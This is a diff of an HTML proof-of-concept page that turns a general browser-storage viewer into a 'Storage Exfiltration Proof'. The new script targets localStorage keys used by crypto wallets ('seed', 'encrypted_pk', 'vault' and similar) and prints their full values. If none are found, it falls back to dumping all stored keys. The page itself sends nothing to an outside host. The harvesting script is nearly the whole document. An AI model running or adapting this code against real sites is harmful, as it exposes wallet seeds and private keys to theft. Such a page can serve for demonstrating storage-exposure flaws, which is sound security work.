@@ -1,46 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Storage Reconnaissance Tool</title>
+    <title>Storage Exfiltration Proof</title>
     <style>
-        body { font-family: monospace; padding: 20px; background: #1a1a1a; color: #0f0; }
-        .box { border: 1px solid #333; padding: 10px; margin-bottom: 20px; }
-        pre { color: #fff; overflow-x: auto; }
-        h3 { color: #ff9900; }
+        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
+        .data-found { color: #fff; border: 1px solid #0f0; padding: 10px; margin-top: 10px; }
     </style>
 </head>
 <body>
-    <h3>[+] Storage Reconnaissance Scan</h3>
-    
-    <div class="box">
-        <h4>LocalStorage Scan:</h4>
-        <pre id="ls-output"></pre>
-    </div>
-
-    <div class="box">
-        <h4>SessionStorage Scan:</h4>
-        <pre id="ss-output"></pre>
-    </div>
+    <h3>[+] Real Storage Exfiltration Scan</h3>
+    <div id="results"></div>
 
     <script>
-        // 1. Scan LocalStorage
-        const lsOutput = document.getElementById('ls-output');
-        if (localStorage.length === 0) {
-            lsOutput.innerText = "No data found.";
-        } else {
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                const val = localStorage.getItem(key);
-                lsOutput.innerHTML += `<b>Key:</b> ${key} <br><b>Value:</b> ${val.substring(0, 50)}...<br><br>`;
-            }
-        }
+        const resultsDiv = document.getElementById('results');
+        
+        // Daftar key yang sering digunakan dompet kripto untuk menyimpan data
+        const sensitiveKeys = ['vault', 'wallet_data', 'encrypted_pk', 'seed', 'enc_pk', 'user_vault'];
 
-        // 2. Scan SessionStorage
-        const ssOutput = document.getElementById('ss-output');
-        for (let i = 0; i < sessionStorage.length; i++) {
-            const key = sessionStorage.key(i);
-            const val = sessionStorage.getItem(key);
-            ssOutput.innerHTML += `<b>Key:</b> ${key} <br><b>Value:</b> ${val.substring(0, 50)}...<br><br>`;
+        resultsDiv.innerHTML += "Scanning for sensitive keys...<br>";
+
+        let found = false;
+        sensitiveKeys.forEach(key => {
+            const data = localStorage.getItem(key);
+            if (data) {
+                found = true;
+                resultsDiv.innerHTML += `<div class="data-found">
+                    <b>FOUND KEY: ${key}</b><br>
+                    <b>VALUE:</b> <pre>${data}</pre>
+                </div>`;
+            }
+        });
+
+        if (!found) {
+            resultsDiv.innerHTML += "No common wallet keys found. Scanning all storage...<br>";
+            for (let i = 0; i < localStorage.length; i++) {
+                const k = localStorage.key(i);
+                resultsDiv.innerHTML += `Key: ${k} | Value: ${localStorage.getItem(k).substring(0, 30)}...<br>`;
+            }
         }
     </script>
 </body>
